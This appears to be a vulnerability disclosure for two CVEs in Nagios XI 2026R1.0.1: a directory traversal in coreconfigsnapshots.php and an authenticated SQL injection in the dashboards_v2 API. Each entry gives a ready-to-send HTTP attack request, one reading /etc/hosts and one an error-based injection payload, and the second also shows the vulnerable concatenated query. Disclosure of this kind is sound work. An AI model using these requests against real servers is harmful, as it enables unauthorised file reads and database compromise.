## CVE-2025-67254
> [Suggested description]
> NagiosXI 2026R1.0.1 build 1762361101 is vulnerable to Directory
> Traversal in /admin/coreconfigsnapshots.php.
>
> ------------------------------------------
> [Vulnerability Type]
> Directory Traversal
>
> ------------------------------------------
>
> [Vendor of Product]
> Nagios
>
> ------------------------------------------
>
> [Affected Product Code Base]
> Nagios XI - NagiosXI = 2026R1.0.1 build 1762361101
>
> ------------------------------------------
>
> [Affected Component]
> Vulnerable file:/usr/local/nagiosxi/html/admin/coreconfigsnapshots.php,
>
> ------------------------------------------
>
> [Attack Vectors]
> GET /nagiosxi/admin/coreconfigsnapshots.php?currentdiff=../../../../../../../../etc/hosts&archive=0 HTTP/1.1
> Host: 192.168.4.235
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
> Accept: */*
> Accept-Language: en,zh;q=0.5
> Accept-Encoding: gzip, deflate
> Connection: close
> Cookie: nagiosxi=4mae4aaom2ul26v7mug1qqt2k0
> If-None-Match: "31c3-6448fabb1e820-gzip"
> Priority: u=2



## CVE-2025-67255
> [Suggested description]
> In NagiosXI 2026R1.0.1 build 1762361101, Dashboard parameters lack
> proper filtering, allowing any authenticated user to exploit a SQL
> Injection vulnerability.
>
> ------------------------------------------
>
> [Vulnerability Type]
> SQL Injection
>
> ------------------------------------------
>
> [Vendor of Product]
> Nagios
>
> ------------------------------------------
>
> [Affected Product Code Base]
> Nagios XI - NagiosXI = 2026R1.0.1 build 1762361101
>
> ------------------------------------------
>
> [Affected Component]
> Vulnerable file: /usr/local/nagiosxi/html/api/v2/endpoints/dashboards_v2/index.php,
> function get() {
> $id = grab_request_var('id', '');
> $sql = "....WHERE dashboard_id='" . $id . "' AND...."
> $dashboards = exec_sql_query(DB_NAGIOSXI, $sql);
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Code execution]
> true
>
> ------------------------------------------
>
> [Impact Escalation of Privileges]
> true
>
> ------------------------------------------
>
> [Impact Information Disclosure]
> true
>
> ------------------------------------------
>
> [Attack Vectors]
> GET /nagiosxi/api/v2/dashboards_v2?id=%27and+extractvalue(1,concat(0x7e,(select+@@hostname),0x7e))%23 HTTP/1.1
> Host: 192.168.4.235
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
> Accept: */*
> Accept-Language: en,zh;q=0.5
> Accept-Encoding: gzip, deflate
> Connection: close
> Cookie: nagiosxi=4mae4aaom2ul26v7mug1qqt2k0
> If-None-Match: "31c3-6448fabb1e820-gzip"
> Priority: u=2
